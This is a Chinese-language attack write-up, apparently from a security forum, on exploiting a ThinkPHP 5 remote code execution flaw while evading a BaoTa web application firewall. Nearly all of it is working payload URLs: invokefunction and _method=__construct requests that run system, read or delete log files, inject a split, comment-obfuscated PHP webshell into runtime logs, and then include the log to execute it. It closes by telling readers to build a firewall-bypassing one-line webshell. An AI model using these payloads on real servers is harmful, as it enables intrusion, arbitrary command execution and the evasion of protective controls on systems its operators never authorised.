前言
==

在一个项目上发现了一个tp5的rce漏洞，但是有宝塔拦截了

通常宝塔拦截了后，一些system、assert等危险函数是不能用了，但可以使用tp5的函数进行文件包含

但是我遇到这个宝塔应该不是默认规则，一些whoami、id、ipconfig、&lt;?php a、等也会拦截，挺难绕过的，只好从文件包含日志下手了，这里直接将一句话木马写入日志是会被拦截的，所以只能另找方法。

RCE绕宝塔
======

### POC1

文件包含日志通常是构造语句写入日志，然后包含日志文件

```php
/index.php?s=index&content=<?php phpinfo();?>
/index.php?s=index/\think\Lang/load&file=../runtime/log/202201/21.log
```

但是很多时候我们构造语句时导致日志坏了，就不能包含了

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-36a2ab2c09307005f55d5cceae73f5abcacd4200.png)  
需要将日志删除，然后重新构造

```php
/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=unlink&vars[1][]=../runtime/log/202201/21.log
```

有时候宝塔规则太狠了，发现`<?php ?>`或其它就给拦截，我们可以通过拆分进行构造语句

首先正常访问

```php
http://192.168.172.129:8808/index.php?s=index&content=test11
```

然后观察最新一条日志记录了什么

```php
/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_get_contents&vars[1][]=../runtime/log/202201/21.log
```

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-99e4c726aa9a7877662163f620a0adec9517053b.png)

这里还要注意编码情况，这里可以看到这几处将我们请求写入了日志，并且没有编码

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-0d94a4bf2f11b59fe299dbc08d012ee954937b64.png)

然后构造一句话，就已简单的`<?php system(id);?>`为例子

通过拆分和注释相互配合

```php
<?php /*.......
.....*/$a="sys"."tem";/*......
....*/$b="id";/*.....
....*/$a($b);/*
```

将上面四句话分别插入对应位置

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-5b23b1819023a82f28fc27bb526e43b3601db3f7.png)

成功插入日志中  
![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-17943c38ccace880856d5d3093b48499a3e56922.png)

最后包含日志

```php
/index.php?s=index/\think\Lang/load&file=../runtime/log/202201/21.log
```

![](https://shs3.b.qianxin.com/attack_forum/2022/01/attach-a253571d16b043a07796382bcc09be433f16c03f.png)

然后配合该技巧，构造一个能绕过宝塔的一句话木马即可。

### poc2

也就是另一种rce语句，根据poc1的思路，相同方式写入日志，错误就删日志

```php
get[]=id&_method=__construct&method=get&filter[]=system

get[]=..\runtime\log\202201\14.log&_method=__construct&method=get&filter[]=unlink

get[]=..\runtime\log\202201\14.log&_method=__construct&method=get&filter[]=think\__include_file
```